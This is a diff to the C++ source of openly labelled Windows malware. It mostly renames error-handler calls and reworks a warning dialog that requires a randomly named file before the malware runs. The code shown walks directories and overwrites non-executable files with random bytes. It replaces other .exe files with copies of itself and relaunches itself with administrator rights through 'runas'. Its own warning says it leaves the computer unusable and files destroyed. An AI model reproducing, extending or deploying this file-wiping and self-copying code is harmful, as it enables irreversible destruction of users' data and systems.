@@ -13,28 +13,19 @@
 #include "../Header-Files/pch.h"
 #include "../Header-Files/N0T-iLLerka.h"
 
-#if defined(_WINDOWS)
 INT APIENTRY wWinMain(
 	_In_     HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
 	_In_     LPWSTR    lpCmdLine,
 	_In_     INT       nShowCmd
 ) {
-#elif defined(_CONSOLE)
-INT wmain(
-	_In_ INT    argc,
-	_In_ LPWSTR argv[],
-	_In_ LPWSTR envp[]
-) {
-	fnPrintConsoleNiXW();
-#endif
 	// Read Commandline Arguments
 	INT nArgs;
 	LPWSTR* szArglist = CommandLineToArgvW(GetCommandLine(), &nArgs);
 
 	// Check if ArgumentList was Created, if not: Exit Malware
 	if (!szArglist) {
-		fnERRORHANDLERW(L"Couldn't parse Commandline", NULL, L"CommandLineToArgvW", MB_ICONERROR);
+		fnMESSAGEHANDLERW(NULL, L"Couldn't parse Commandline", L"CommandLineToArgvW", MB_ICONERROR);
 		ExitProcess(EXIT_FAILURE);
 	}
 
@@ -61,17 +52,17 @@ INT wmain(
 			DWORD dwNOBW;
 			NTSTATUS lBCGRr;
 			for (std::wstring i : vszFile) {
-				HANDLE hFile = CreateFile(i.c_str(), GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
+				HANDLE hFile = CreateFile(i.c_str(), GENERIC_ALL, NULL, NULL, OPEN_EXISTING, 0, NULL);
 				if (hFile) {
 					if (!lstrcmp(PathFindExtension(i.c_str()), L".exe")) {
 						if (lstrcmp(i.c_str(), szMfn)) {
 							if (SetFileAttributes(i.c_str(), FILE_ATTRIBUTE_NORMAL)) {
 								if (!CopyFile(szMfn, i.c_str(), FALSE)) {
-									fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW",
+									fnMESSAGEHANDLERW(NULL, L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", L"CopyFileW",
 										MB_ICONERROR, szMfn, i.c_str());
 								}
 							} else {
-								fnERRORHANDLERW(L"Couldn't set File Attribute", NULL, L"SetFileAttributes", MB_ICONERROR);
+								fnMESSAGEHANDLERW(NULL, L"Couldn't set File Attribute", L"SetFileAttributesW", MB_ICONERROR);
 							}
 						}
 					} else if (GetFileSizeEx(hFile, &liFs)) {
@@ -85,23 +76,23 @@ INT wmain(
 						if (pszRd) {
 							lBCGRr = BCryptGenRandom(NULL, (LPBYTE)pszRd, liFs.LowPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 							if (lBCGRr) {
-								fnERRORHANDLERW(L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", NULL, L"BCryptGenRandom",
+								fnMESSAGEHANDLERW(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom",
 									MB_ICONWARNING);
 								ZeroMemory(pszRd, liFs.LowPart);
 							}
 							if (!WriteFile(hFile, pszRd, liFs.LowPart, &dwNOBW, NULL)) {
-								fnERRORHANDLERW(L"Couldn't overwrite FileData", NULL, L"WriteFile", MB_ICONERROR);
+								fnMESSAGEHANDLERW(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_ICONERROR);
 							}
 
 							delete[] pszRd;
 						} else {
-							fnERRORHANDLERW(L"Couldn't allocate Buffer", NULL, L"new(malloc(HeapAlloc))", MB_ICONERROR);
+							fnMESSAGEHANDLERW(NULL, L"Couldn't allocate Buffer", L"new(malloc(HeapAlloc))", MB_ICONERROR);
 						}
 					}
 
 					CloseHandle(hFile);
 				} else {
-					fnERRORHANDLERW(L"Couldn't open existing File\n File: %s", NULL, L"CreateFileW", MB_ICONERROR, i.c_str());
+					fnMESSAGEHANDLERW(NULL, L"Couldn't open existing File\n File: %s", L"CreateFileW", MB_ICONERROR, i.c_str());
 				}
 			}
 
@@ -112,7 +103,7 @@ INT wmain(
 				if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
 					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
 				} else {
-					fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW",
+					fnMESSAGEHANDLERW(NULL, L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", L"CopyFileW",
 						MB_ICONERROR, szMfn, szNfn.c_str());
 				}
 			}
@@ -131,18 +122,18 @@ INT wmain(
 #endif // DEBUG_MSG
 
 		if (!fnIsUserAdmin()) {
-			fnERRORHANDLERW(L"Process isn't Administrator", NULL, L"fnIsUserAdmin", MB_ICONERROR);
+			fnMESSAGEHANDLERW(NULL, L"Process isn't Administrator", L"fnIsUserAdmin", MB_ICONERROR);
 			LocalFree(szArglist);
 			ExitProcess(EXIT_FAILURE);
 		}
 		if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
-			fnERRORHANDLERW(L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", NULL, L"SetPriorityClass", MB_ICONWARNING);
+			fnMESSAGEHANDLERW(NULL, L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", L"SetPriorityClass", MB_ICONWARNING);
 		}
 
 #if SYNCHRONIZATION == TRUE
 		// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
 		if (fnCheckMutexW(szHOST_MUTEX)) {
-			fnERRORHANDLERW(L"Malware Host is already running\n(Mutex already exist)", NULL, L"fnCheckMutexW", MB_ICONINFORMATION);
+			fnMESSAGEHANDLERW(NULL, L"Malware Host is already running\n(Mutex already exist)", L"fnCheckMutexW", MB_ICONINFORMATION);
 
 			LocalFree(szArglist);
 			ExitProcess(EXIT_FAILURE);
@@ -150,7 +141,7 @@ INT wmain(
 			// Create /host Mutex for /exec operation
 			HANDLE hMutex = CreateMutex(NULL, TRUE, szHOST_MUTEX);
 			if (!hMutex) {
-				fnERRORHANDLERW(L"Couldn't create /host Mutex", NULL, L"CreateMutexW", MB_ICONERROR);
+				fnMESSAGEHANDLERW(NULL, L"Couldn't create /host Mutex", L"CreateMutexW", MB_ICONERROR);
 				LocalFree(szArglist);
 				ExitProcess(EXIT_FAILURE);
 			}
@@ -184,7 +175,7 @@ INT wmain(
 					if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
 						ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
 					} else {
-						fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW",
+						fnMESSAGEHANDLERW(NULL, L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", L"CopyFileW",
 							MB_ICONERROR, szMfn, szNfn.c_str());
 					}
 				}
@@ -195,7 +186,7 @@ INT wmain(
 				if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
 					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
 				} else {
-					fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW",
+					fnMESSAGEHANDLERW(NULL, L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", L"CopyFileW",
 						MB_ICONERROR, szMfn, szNfn.c_str());
 				}
 			}
@@ -242,7 +233,7 @@ INT wmain(
 				break;
 			} else {
 				if (i == (50 - 1)) {
-					fnERRORHANDLERW(L"Malware Host failed to launch", NULL, L"fnCheckMutexW", MB_ICONERROR);
+					fnMESSAGEHANDLERW(NULL, L"Malware Host failed to launch", L"fnCheckMutexW", MB_ICONERROR);
 					LocalFree(szArglist);
 					ExitProcess(EXIT_FAILURE);
 				}
@@ -254,17 +245,19 @@ INT wmain(
 		// Ugly formating, sorry for that...
 #if WARNING == TRUE
 		// Warn User about the execution of the Malware
-		if (MessageBox(NULL, L"The Software you're trying to execute is considered Malware !\n\n"
-			L"Running this Malware will result in your Computer being unusable "
-			L"and your Files being irreparably damaged/destroyed.\n\n"
-			L"If you're seeing this Message without knowing what you just executed, simply press NO and nothing will happen.\n"
-			L"If you know what you're doing press YES to continue.\n\n"
-			L"DO YOU WANT TO EXECUTE THIS MALWARE ?", szMALWR_NAME, MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
-			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str())) {
-				ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
-			} else {
-				LocalFree(szArglist);
-				ExitProcess(EXIT_FAILURE);
+		std::wstring szRCheck = fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN));
+
+		LPVOID lpMessage = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (lstrlen(szWarningMSG) * 2));
+		if (SUCCEEDED(StringCchPrintf((LPWSTR)lpMessage, lstrlen(szWarningMSG), szWarningMSG, szRCheck.c_str()))) {
+			if (MessageBox(NULL, (LPCWSTR)lpMessage, szMALWR_NAME, MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
+				if (CreateFile(szRCheck.c_str(), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) != INVALID_HANDLE_VALUE) {
+					if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str())) {
+						ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
+					} else {
+						LocalFree(szArglist);
+						ExitProcess(EXIT_FAILURE);
+					}
+				}
 			}
 		}
 #else // WARNING
